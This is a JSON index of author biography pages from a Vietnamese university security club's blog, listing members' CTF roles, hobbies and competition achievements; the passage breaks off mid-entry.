[{"authors":null,"categories":null,"content":"Info of me Hello, I am Lê Hoàng, a Web player of team BKISC, Ho Chi Minh City University of Technology. Currently, I am learning in the field of Computer Science. I am interested in cybersecurity and the ways in which we can protect our digital assets from threats.\nThrough my coursework and personal projects, I have gained experience in programming languages such as C++, Golang, Python, Java, JavaScript and PHP (misery).\nAt the moment, I am trying to comprehend the vast ammount of knowledge of cryptography and having my free time invested on game hacking as a hobby.\nCurrent Achievements Qualified for ISITDTU CTF 2022 Finals\n10th place for ASCIS 2022\nQualified for ASCIS 2022 Finals\nHave not failed on any subjects at Ho Chi Minh University of Technology\n","date":1695686400,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1695686400,"objectID":"144496c7ef3996947738eb132df5c380","permalink":"https://blog.bkisc.com/author/le-hoang/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/le-hoang/","section":"authors","summary":"Info of me Hello, I am Lê Hoàng, a Web player of team BKISC, Ho Chi Minh City University of Technology. Currently, I am learning in the field of Computer Science.","tags":null,"title":"Lê Hoàng","type":"authors"},{"authors":["BaoDoktah"],"categories":null,"content":"Hi there! My name is BaoDoktah and I am a Reverse Engineer for BKISC’s blog. With 3 months of experience in the field of cybersecurity, I specialize in analyzing software and hardware systems to understand how they work, how they can be exploited, and how they can be improved. I am passionate about staying up-to-date with the latest trends and techniques in reverse engineering and am always seeking new challenges to sharpen my skills. I look forward to sharing my knowledge and insights with you through this blog!\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"0cd8e2789d6d14c58cabde60f2dcca6c","permalink":"https://blog.bkisc.com/author/baodoktah/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/baodoktah/","section":"authors","summary":"Hi there! My name is BaoDoktah and I am a Reverse Engineer for BKISC’s blog. With 3 months of experience in the field of cybersecurity, I specialize in analyzing software and hardware systems to understand how they work, how they can be exploited, and how they can be improved.","tags":null,"title":"BaoDoktah","type":"authors"},{"authors":null,"categories":null,"content":"I am cocay.\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"b8ca76484410b4e38c809cf56ca31dfa","permalink":"https://blog.bkisc.com/author/cocay/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/cocay/","section":"authors","summary":"I am cocay.","tags":null,"title":"cocay","type":"authors"},{"authors":["dasHaus165"],"categories":null,"content":"Some Background Informations I am dasHaus165, a Cryptographer from team BKISC, HCMC University of Technology.\nI love playing football and I am also a half-season fan of Bayern Munich.\nAchievements Nothing yet.\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"e98b336ce73dbd9c2ebf4c7afd4bb5e0","permalink":"https://blog.bkisc.com/author/dashaus165/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/dashaus165/","section":"authors","summary":"Some Background Informations I am dasHaus165, a Cryptographer from team BKISC, HCMC University of Technology.\nI love playing football and I am also a half-season fan of Bayern Munich.\nAchievements Nothing yet.","tags":null,"title":"dasHaus165","type":"authors"},{"authors":null,"categories":null,"content":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.\nI am also looking forward to learn more about Software Engineering in the future.\nNoticeable Achievements Qualified for ISITDTU CTF 2022 Finals\nRanked 57th as HCMUT Last Dance in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"e7c86612d2a48e15b6888aa79a874f7c","permalink":"https://blog.bkisc.com/author/fazect/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/fazect/","section":"authors","summary":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.","tags":null,"title":"FazeCT","type":"authors"},{"authors":null,"categories":null,"content":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"82f26d50ab3ef4f3c9efe0569c2150db","permalink":"https://blog.bkisc.com/author/hdthinh1012/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/hdthinh1012/","section":"authors","summary":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.","tags":null,"title":"hdthinh1012","type":"authors"},{"authors":null,"categories":null,"content":"Player Name: Lio\nClass: Pwner, Keyboard Hero (former)\nLevel: 21\nWeapon: Keyboard of Destruction +15\nArmor: Shadowweave Cloak of Introvertedness +15\nBackground Yuri enthusiast. Diagnosed with chronic gacha addiction.\nPlaying PWN cause I’m too dumb at math to pursue cryptography, won’t be playing REV since I’m too lazy to read code. But I’m currently trying to expand my knowledge in web exploitation (still a noob tho).\n“If a program has more than 7 functions or a function has more than 100 lines, I will not read it.”\nSkills  Coding Mastery: 69/100 Laziness Control: 0/100 Sleeping Mastery: 9999999/100  Achievements TOP 10 as Fried Rice in GAMEUIT HACKATHON 2022\nQualified for Hacktheon Sejong 2023 Finals\nConsolation Prize in ASEAN Student Contest on Information Security 2023\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"88fbe8ccb88e37a0b1d6aad2209af406","permalink":"https://blog.bkisc.com/author/lio/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/lio/","section":"authors","summary":"Player Name: Lio\nClass: Pwner, Keyboard Hero (former)\nLevel: 21\nWeapon: Keyboard of Destruction +15\nArmor: Shadowweave Cloak of Introvertedness +15\nBackground Yuri enthusiast. Diagnosed with chronic gacha addiction.\nPlaying PWN cause I’m too dumb at math to pursue cryptography, won’t be playing REV since I’m too lazy to read code.","tags":null,"title":"Lio","type":"authors"},{"authors":null,"categories":null,"content":"A cryptographer from BKISC - BK Information Security Club.\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"0de111736dc8c03e9d3228739e619d4e","permalink":"https://blog.bkisc.com/author/nothing/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/nothing/","section":"authors","summary":"A cryptographer from BKISC - BK Information Security Club.","tags":null,"title":"Nothing","type":"authors"},{"authors":null,"categories":null,"content":"Background I am Onirique, also known as Junvalentine, currently studying in the field of Applied Cryptography (absolute noob).\nLove traveling and football (a royal fan of Man United).\nAlso doing Competitive Programming on Codeforces for fun.\nAchievements Qualified for ISITDTU CTF 2022 Finals\nHonorable Mention at National Olympics in Informatics (2022)\nRanked 57th as HCMUT Last Dance in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"20c445a403d17f2d54ecc50c70677e8c","permalink":"https://blog.bkisc.com/author/onirique/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/onirique/","section":"authors","summary":"Background I am Onirique, also known as Junvalentine, currently studying in the field of Applied Cryptography (absolute noob).\nLove traveling and football (a royal fan of Man United).\nAlso doing Competitive Programming on Codeforces for fun.","tags":null,"title":"Onirique","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, My name is Hoàng Long, aka TN, a Cryptographer from team BKISC, HCMC University of Technology.\nFun facts:\n I have a Chemical Engineering background I am a Yasuo main in League of Legends (D1 actually) hehe Sudoku enjoyer KPOP is life TN stands for “Hasagi”  Achievements ACSC 2023 Quals: Ranked 6th in Viet Nam\nCRYPTOHACK: 4th place in Viet Nam\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"d719fc467e13558b6d9bf0feb333480c","permalink":"https://blog.bkisc.com/author/tn/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/tn/","section":"authors","summary":"Background Hi, My name is Hoàng Long, aka TN, a Cryptographer from team BKISC, HCMC University of Technology.\nFun facts:\n I have a Chemical Engineering background I am a Yasuo main in League of Legends (D1 actually) hehe Sudoku enjoyer KPOP is life TN stands for “Hasagi”  Achievements ACSC 2023 Quals: Ranked 6th in Viet Nam","tags":null,"title":"TN","type":"authors"},{"authors":null,"categories":null,"content":"I am a whale.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"0fe299e9ae1df2c9b6aabd1ee9d30a6a","permalink":"https://blog.bkisc.com/author/bigbluewhale111/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/bigbluewhale111/","section":"authors","summary":"I am a whale.","tags":null,"title":"bigbluewhale111","type":"authors"},{"authors":null,"categories":null,"content":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, consisting mainly of students from Ho Chi Minh University of Technology (HCMUT). We were founded to provide studying, researching, cooperating environments for those interested in cyber security.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://blog.bkisc.com/author/bkisc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/bkisc/","section":"authors","summary":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, consisting mainly of students from Ho Chi Minh University of Technology (HCMUT).","tags":null,"title":"BKISC","type":"authors"},{"authors":null,"categories":null,"content":"A cryptographer from BKISC - BK Information Security Club.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"56b43da3333228512a0e7d8f51e74a7d","permalink":"https://blog.bkisc.com/author/catto/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/catto/","section":"authors","summary":"A cryptographer from BKISC - BK Information Security Club.","tags":null,"title":"catto","type":"authors"},{"authors":["Cyese"],"categories":null,"content":"Background  I am Cyese, a newbie in the field of binary exploitation. Getting into the Security realm is a novel and challenging experience to me personally, and hopefully a memoriable one.\nAs a generic homosapien, I enjoy a slow and peaceful lifestyle, while enpanding my horizon and understanding of the world around me.\nA book’s meaning is based on the viewpoints of its reader\nAchievements  Top 12 teams as AFools in Minathon 2023 at HCMUT\nNote  AnotherEden Gacha Addict  ","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"8432b46f55c4c896e2c19cfcbcf201c3","permalink":"https://blog.bkisc.com/author/cyese/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/cyese/","section":"authors","summary":"Background  I am Cyese, a newbie in the field of binary exploitation. Getting into the Security realm is a novel and challenging experience to me personally, and hopefully a memoriable one.","tags":null,"title":"Cyese","type":"authors"},{"authors":null,"categories":null,"content":"Background My name is Dang Le, also known under my nickname midas or lkmidas. I’m currently a Research Intern at Northwestern University under the supervision of Dr. Xinyu Xing. Before this, I received my B.Eng in Computer Engineering from Ho Chi Minh City University of Technology in 2022. My current research focus is Kernel Security and a bit of Smart Contract Security. I’m also doing a bit of Reverse Engineering on my own time. In my undergraduate days, I participated in many CTF competitions and achieved several national and international prizes, my main CTF categories were Pwn and RE. Nowadays, I don’t really try hard CTFs for ranking, just play for fun when I have time.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"1ef52903267cd3de24dcb7d8292d0601","permalink":"https://blog.bkisc.com/author/dang-midas-le/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/dang-midas-le/","section":"authors","summary":"Background My name is Dang Le, also known under my nickname midas or lkmidas. I’m currently a Research Intern at Northwestern University under the supervision of Dr. Xinyu Xing. Before this, I received my B.","tags":null,"title":"Dang \"midas\" Le","type":"authors"},{"authors":null,"categories":null,"content":"Wassup, I am Eenosse, your friendly noob hacker.\nLove doing random things.\nMan United fan for 10 years (literally).\n🦔\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"843c9c73f81d6949fe950c4e6585a81f","permalink":"https://blog.bkisc.com/author/eenosse/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/eenosse/","section":"authors","summary":"Wassup, I am Eenosse, your friendly noob hacker.\nLove doing random things.\nMan United fan for 10 years (literally).\n🦔","tags":null,"title":"Eenosse","type":"authors"},{"authors":null,"categories":null,"content":"A reverser from BKISC - BK Information Security Club.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"d0ddd80e2fe52bc1ea68b872e1ad25c0","permalink":"https://blog.bkisc.com/author/frost/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/frost/","section":"authors","summary":"A reverser from BKISC - BK Information Security Club.","tags":null,"title":"Frost","type":"authors"},{"authors":null,"categories":null,"content":"I am a sad horse.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"d355e52a8e0ef71e8f8fd31924b000c6","permalink":"https://blog.bkisc.com/author/h4n13/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/h4n13/","section":"authors","summary":"I am a sad horse.","tags":null,"title":"h4n13","type":"authors"},{"authors":["hah4"],"categories":null,"content":"About me Hi, I am hah4 (Anh-Hung Hoang), a web pentester from BKISC. Currently, I am studying Computer Science at Ho Chi Minh University of Technology.\nStarted as a Back-End developer, I have developed many applications. Because of many requirements in security, I have learned about threats and vulnerabilities. I suddenly realized that I have a passion for hacking, and my road to become a cyber security specialist began since.\nAchievements  First Prize, National Physics Olympiad, 2022 Third Prize, National Physics Olympiad, 2021 First Prize, Provincial Physics Olympiad for Grade 12, 2022 First Prize, Provincial Physics Olympiad for Grade 12, 2021 First Prize, Provincial Solving Math on Calculator Olympiad in Physics, 2022 Gold Medal, April 30th Traditional Olympiad in Physics, 2021  ","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"903180015587da5fc8f922d6b512c1f3","permalink":"https://blog.bkisc.com/author/hah4/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/hah4/","section":"authors","summary":"About me Hi, I am hah4 (Anh-Hung Hoang), a web pentester from BKISC. Currently, I am studying Computer Science at Ho Chi Minh University of Technology.\nStarted as a Back-End developer, I have developed many applications.","tags":null,"title":"hah4","type":"authors"},{"authors":["HappyHacker22"],"categories":null,"content":"About me I am HappyHacker22. I have been a member of BKISC since July 2022, focusing on my studies in Cryptography during that time. I earned my Bachelor’s degree in Computer Engineering in November 2024 and am currently pursuing a Master’s degree in Computer Science, which I expect to complete in 2026. I plan to continue my academic journey by obtaining a PhD in 2030.\nMy specialty is Cryptography, with primary interests in Zero-Knowledge Proofs, Functional Encryption, and Lattice-based Cryptography. I also enjoy exploring the cryptographic aspects of Blockchain technology.\nAchievements  SVATTT Quals 2022: Consolation Prize in team COPIUM. Sinh viên tiêu biểu của Khoa Khoa học và Kỹ thuật Máy tính 2023 và 2024. NSUCRYPTO 2023 and 2024: Sivler prize with senior nothing and daminha NSUCRYPTO 2022: Bronze prize with senior catperson  ","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"7a6965a237010014ad495a9547f49b66","permalink":"https://blog.bkisc.com/author/happyhacker22/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/happyhacker22/","section":"authors","summary":"About me I am HappyHacker22. I have been a member of BKISC since July 2022, focusing on my studies in Cryptography during that time. I earned my Bachelor’s degree in Computer Engineering in November 2024 and am currently pursuing a Master’s degree in Computer Science, which I expect to complete in 2026.","tags":null,"title":"HappyHacker22","type":"authors"},{"authors":["Hoainam1"],"categories":null,"content":"Introduction Hiiii ~\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"db77aefc518304acf062d2c50e9f59a4","permalink":"https://blog.bkisc.com/author/hoainam1/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/hoainam1/","section":"authors","summary":"Introduction Hiiii ~","tags":null,"title":"Hoainam1","type":"authors"},{"authors":["HSon"],"categories":null,"content":"I am HSon.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"d179b6880ab25f94c9088375a9c88566","permalink":"https://blog.bkisc.com/author/hson/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/hson/","section":"authors","summary":"I am HSon.","tags":null,"title":"HSon","type":"authors"},{"authors":null,"categories":null,"content":"Background I am Trung Kien and I major in Computer Science. Proud member of the BKISC.\nI am looking forward to learning a lot about computer security.\nNoticeable Achievements Nothing yet here.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"3c61c80168ab61d92b3939561e85193d","permalink":"https://blog.bkisc.com/author/jitensha69/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/jitensha69/","section":"authors","summary":"Background I am Trung Kien and I major in Computer Science. Proud member of the BKISC.\nI am looking forward to learning a lot about computer security.\nNoticeable Achievements Nothing yet here.","tags":null,"title":"jitensha69","type":"authors"},{"authors":null,"categories":null,"content":"A cryptographer from Efiens team. He is currently a senior of BKISC - BK Information Security Club.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"8828df7a9a39911c1901215815ffde3a","permalink":"https://blog.bkisc.com/author/jstd/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/jstd/","section":"authors","summary":"A cryptographer from Efiens team. He is currently a senior of BKISC - BK Information Security Club.","tags":null,"title":"JstD","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, I’m Khang Vo, also known as doublevkay, and I am a passionate cyber security researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on web-related challenges. This experience ignited my passion for cybersecurity and led me to specialize in this field.\nAt present, my main focus is on penetration testing, devsecops, and static application security testing, especially using CodeQL to identify and fix security vulnerabilities in software applications. Additionally, I continuously update my knowledge of blockchain-based applications’ security.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cyber security. I hope to inspire and support the next generation of Bach Khoa security professionals.\nI enjoy contributing to the cyber security community by sharing my findings and insights. You can find my open-source projects on GitHub, and you can reach out to me on Twitter.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"9457c9d7d10348791aab00fe4712b61b","permalink":"https://blog.bkisc.com/author/khang-vo-doublevkay/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/khang-vo-doublevkay/","section":"authors","summary":"Background Hi, I’m Khang Vo, also known as doublevkay, and I am a passionate cyber security researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on web-related challenges.","tags":null,"title":"Khang Vo (doublevkay)","type":"authors"},{"authors":null,"categories":null,"content":"My name is Khoa. I used to dedicate a lot of time to play CTFs and have developed some skills in Reverse Engineering. Although I am still occasionally spending my spare time to play CTF at weekends, now I want to spend my time studying different fields of computer science and for other hobbies.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"9abef4dc9d7d2f096c2be99631d98a58","permalink":"https://blog.bkisc.com/author/khoavnpsc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/khoavnpsc/","section":"authors","summary":"My name is Khoa. I used to dedicate a lot of time to play CTFs and have developed some skills in Reverse Engineering. Although I am still occasionally spending my spare time to play CTF at weekends, now I want to spend my time studying different fields of computer science and for other hobbies.","tags":null,"title":"khoavnpsc","type":"authors"},{"authors":null,"categories":null,"content":"About me Hi, I’m Nghia Tran aka Leon, a Web player of team BKISC. I am a final-year student with a passion for cyber security.\nI am excited to continue exploring the fascinating world of cyber security and applying my skills to real-world challenges.\nCertificates   Cybersecurity Pathway issued by Cisco\n  IBM Cybersecurity Analyst authorized by IBM\nMore\n  ","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"7f5765d0b02032c4a10fb99999859b65","permalink":"https://blog.bkisc.com/author/leon/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/leon/","section":"authors","summary":"About me Hi, I’m Nghia Tran aka Leon, a Web player of team BKISC. I am a final-year student with a passion for cyber security.\nI am excited to continue exploring the fascinating world of cyber security and applying my skills to real-world challenges.","tags":null,"title":"Leon","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, I’m Long Vo Minh, also known as edisc, and I am a passionate cybersecurity researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on binary-related challenges (RE-PWN).\nCurrently, I work at ZaloPay as an Associate Security Engineer responsible for penetration testing of infrastructure systems, including on-premises servers and cloud computing services such as AWS and Kubernetes.\nIn addition, I have knowledge of web pen-testing and am currently studying basic security vulnerabilities such as IDOR, XSS, SQLI, and SSRF.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cybersecurity. I hope to inspire and support the next generation of Bach Khoa security professionals.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"76afb7de2aa2ddd41f0363a9380586a4","permalink":"https://blog.bkisc.com/author/long-vo-minh-edisc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/long-vo-minh-edisc/","section":"authors","summary":"Background Hi, I’m Long Vo Minh, also known as edisc, and I am a passionate cybersecurity researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on binary-related challenges (RE-PWN).","tags":null,"title":"Long Vo Minh (Edisc)","type":"authors"},{"authors":null,"categories":null,"content":"I am Dinh, Final-year student of the HCMUT. I used to be a Pwn Player at CTF team of HCMUT, but currently I am trying something new in blockchain security, web3 and smart contract. Hope this will work !!!\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"3d6e1cbc13305ac78fa919e5428d1d1a","permalink":"https://blog.bkisc.com/author/lsd1nh/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/lsd1nh/","section":"authors","summary":"I am Dinh, Final-year student of the HCMUT. I used to be a Pwn Player at CTF team of HCMUT, but currently I am trying something new in blockchain security, web3 and smart contract.","tags":null,"title":"lsd1nh","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi there, my name is Malosdaf, currently a new member of the BK Information Security Club. I am also a fresher in HCMC University of Technology.\nWith no experience before, I am into cryptography just because it easy.\nRight now, I am looking forward to obtaining and sharing new knowledge.\nNoticeable Achievements Nothing yet here.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"1fb21c9928a7f590867c040f3708ec40","permalink":"https://blog.bkisc.com/author/malosdaf/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/malosdaf/","section":"authors","summary":"Background Hi there, my name is Malosdaf, currently a new member of the BK Information Security Club. I am also a fresher in HCMC University of Technology.\nWith no experience before, I am into cryptography just because it easy.","tags":null,"title":"Malosdaf","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi my name is Masamune. I’m a noob web player from HCMC University of Technology.\nI’m a big fan of Manchester United. Anti when they lose\nAt the moment, I am trying to comprehend valuable knowledge of other security sectors especially cryptography\nNoticeable Achievements Nothing yet here.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"fa33483cf62465bddcb1e5c7530cf5b8","permalink":"https://blog.bkisc.com/author/masamune/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/masamune/","section":"authors","summary":"Background Hi my name is Masamune. I’m a noob web player from HCMC University of Technology.\nI’m a big fan of Manchester United. Anti when they lose\nAt the moment, I am trying to comprehend valuable knowledge of other security sectors especially cryptography","tags":null,"title":"Masamune","type":"authors"},{"authors":["meterglost"],"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"53c4486a0e25e774163549a8a782bd28","permalink":"https://blog.bkisc.com/author/meterglost/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/meterglost/","section":"authors","summary":"","tags":null,"title":"meterglost","type":"authors"},{"authors":["Nguyễn An Khương"],"categories":null,"content":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008. Among of his current interests are applied cryptography, blockchain technology, and applied machine learning.\nIn terms of services, he was a member of the editorial board of the Bulletin of Vietnamese Mathematical Society (2012-2018), and contributed to the Vietnamese editions of “Modern Industrial Statistics: with applications in R, MINITAB and JMP” by R. Kenett, S. Zacks and “Elements” by Euclid of Alexandria as a co-translator. He is also a mentor and supervisor for Efiens team and BKISC team from HCMUT. His research profile is available at https://scholar.google.com/citations?user=ha11OwIAAAAJ\u0026amp;hl=vi\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"f49ea8a282d107f926e610dccbe0d71c","permalink":"https://blog.bkisc.com/author/nguyen-an-khuong/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/nguyen-an-khuong/","section":"authors","summary":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008.","tags":null,"title":"Nguyễn An Khương","type":"authors"},{"authors":["nhatdang1901"],"categories":null,"content":"Some Background Informations I am nhatdang1901, a Cryptographer from team BKISC, HCMC University of Technology.\nI love watching anime and playing badminton.\nAchievements Nothing yet.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"02f1e0ad6f1d7aba78894dabb56fd654","permalink":"https://blog.bkisc.com/author/nhatdang1901/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/nhatdang1901/","section":"authors","summary":"Some Background Informations I am nhatdang1901, a Cryptographer from team BKISC, HCMC University of Technology.\nI love watching anime and playing badminton.\nAchievements Nothing yet.","tags":null,"title":"nhatdang1901","type":"authors"},{"authors":null,"categories":null,"content":"A cryptographer from BKISC - BK Information Security Club.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"239187a1a62cd788683b73722209ca55","permalink":"https://blog.bkisc.com/author/npn/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/npn/","section":"authors","summary":"A cryptographer from BKISC - BK Information Security Club.","tags":null,"title":"npn","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi my name is Ntc, a Web player from HCMC University of Technology.\nEnjoy lazing around or sleeping on weekends, watching vtubers and chilling with depression music.\nDedicating my wallet love to anime-related stuffs. Definitely not a weeboo.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"b9abf8271625a51ea10f574dd6aaf4db","permalink":"https://blog.bkisc.com/author/ntc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/ntc/","section":"authors","summary":"Background Hi my name is Ntc, a Web player from HCMC University of Technology.\nEnjoy lazing around or sleeping on weekends, watching vtubers and chilling with depression music.\nDedicating my wallet love to anime-related stuffs.","tags":null,"title":"Ntc","type":"authors"},{"authors":null,"categories":null,"content":"Background Hello i’m Nyankirie, a normie wanna be hacker.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"475f5b7eaa434ad2b4c28f941f767d3f","permalink":"https://blog.bkisc.com/author/nyankirie/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/nyankirie/","section":"authors","summary":"Background Hello i’m Nyankirie, a normie wanna be hacker.","tags":null,"title":"Nyankirie","type":"authors"},{"authors":null,"categories":null,"content":"Background I’m Phuc000, Computer Science student in Faculty of Computer Science and Engineering, HCMC University of Technology, Vietnam. Reverser from team BKISC.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"3bcc0edc0864f422b7202b94cfe53b62","permalink":"https://blog.bkisc.com/author/phuc000/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/phuc000/","section":"authors","summary":"Background I’m Phuc000, Computer Science student in Faculty of Computer Science and Engineering, HCMC University of Technology, Vietnam. Reverser from team BKISC.","tags":null,"title":"Phuc000","type":"authors"},{"authors":null,"categories":null,"content":"A pwner from Efiens team. He is currently a senior of BKISC - BK Information Security Club.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"67f2ad2ece118993fd30d3a97a95c53d","permalink":"https://blog.bkisc.com/author/pickaxe/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/pickaxe/","section":"authors","summary":"A pwner from Efiens team. He is currently a senior of BKISC - BK Information Security Club.","tags":null,"title":"Pickaxe","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, I’m QuiUzumaki, a Computer Science student and a member of team BKISC, Ho Chi Minh University of Technology.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"256dc2f9c4e38fd7696be76d001a4385","permalink":"https://blog.bkisc.com/author/quiuzumaki-qui-do/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/quiuzumaki-qui-do/","section":"authors","summary":"Background Hi, I’m QuiUzumaki, a Computer Science student and a member of team 